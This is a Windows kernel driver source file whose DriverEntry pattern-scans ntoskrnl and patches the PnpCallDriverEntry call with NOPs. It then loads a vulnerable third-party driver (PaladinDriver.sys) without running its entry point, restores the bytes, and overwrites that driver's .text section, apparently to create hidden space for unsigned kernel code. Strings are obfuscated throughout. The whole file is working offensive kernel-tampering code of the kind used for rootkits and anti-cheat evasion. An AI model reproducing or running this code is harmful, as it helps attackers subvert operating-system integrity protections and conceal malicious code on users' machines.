#include <ntifs.h>
#include <windef.h>
#include <cstdint>
#include <intrin.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <kernel/defs.h>

#include <kernel/structures.hpp>
#include <kernel/xor.hpp>

#include <impl/communication/structs.h>

#include <impl/imports.h>
#include <impl/scanner.h>
#include <impl/modules.h>

#define PATCH_LENTH 5

__int64 DriverEntry(PVOID a1, PVOID a2)
{
	const auto ntoskrnl_base = modules::get_kernel_module(skCrypt("ntoskrnl.exe"));
	if (!ntoskrnl_base)
	{
		printf("Couldnt find ntoskrnl.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Ntoskrnl base: 0x%llx\n", ntoskrnl_base);

	const auto calldrv_address = scanner::find_pattern(ntoskrnl_base, "\xE8\x00\x00\x00\x00\x44\x8B\xF0\x85\xC0\x78\x15", "x????xxxxxxx");
	if (!calldrv_address)
	{
		printf("Invalid pattern.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("PnpCallDriverEntry address: 0x%llx\n", calldrv_address);

	const auto original_bytes = (uint8_t*)imports::ex_allocate_pool(NonPagedPool, PATCH_LENTH);
	if (!original_bytes)
	{
		printf("Failed to allocate buffer.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Original bytes buffer: 0x%llx\n", (uintptr_t)original_bytes);

	// Patch IopLoadDriver to not call driver entry
	ctx::nop_address_range(calldrv_address, PATCH_LENTH, original_bytes);

	// Load driver to exploit
	if (!modules::load_vurn_driver(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv1"))
	{
		printf("Couldnt load driver.\n");
		ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
		imports::ex_free_pool_with_tag(original_bytes, 0);
		return STATUS_UNSUCCESSFUL;
	}
	printf("Loaded vurnable driver.\n");
	
	// Restore bytes
	ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
	imports::ex_free_pool_with_tag(original_bytes, 0);

	printf("Restored original bytes.\n");

	const auto vurn_driver_base = modules::get_kernel_module(skCrypt("PaladinDriver.sys"));
	if (!vurn_driver_base) 
	{
		printf("Couldnt find vurnable driver.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Vurnable driver base: 0x%llx\n", vurn_driver_base);

	const auto text_section = modules::find_section(vurn_driver_base, ".text");
	if (!text_section) 
	{
		printf("Text section is invalid.\n");
		return STATUS_UNSUCCESSFUL;
	}
	printf("Text section size: 0x%llx\n", text_section.size);
	printf("Text section base: 0x%llx\n", text_section.address);

	const auto buffer = (uint8_t*)imports::ex_allocate_pool(NonPagedPool, text_section.size);
	if (!buffer)
	{
		printf("Failed to allocate buffer.\n");
		return STATUS_UNSUCCESSFUL;
	}

	ctx::nop_address_range(text_section.address, text_section.size, buffer);
	imports::ex_free_pool_with_tag(buffer, 0);

	return STATUS_SUCCESS;
}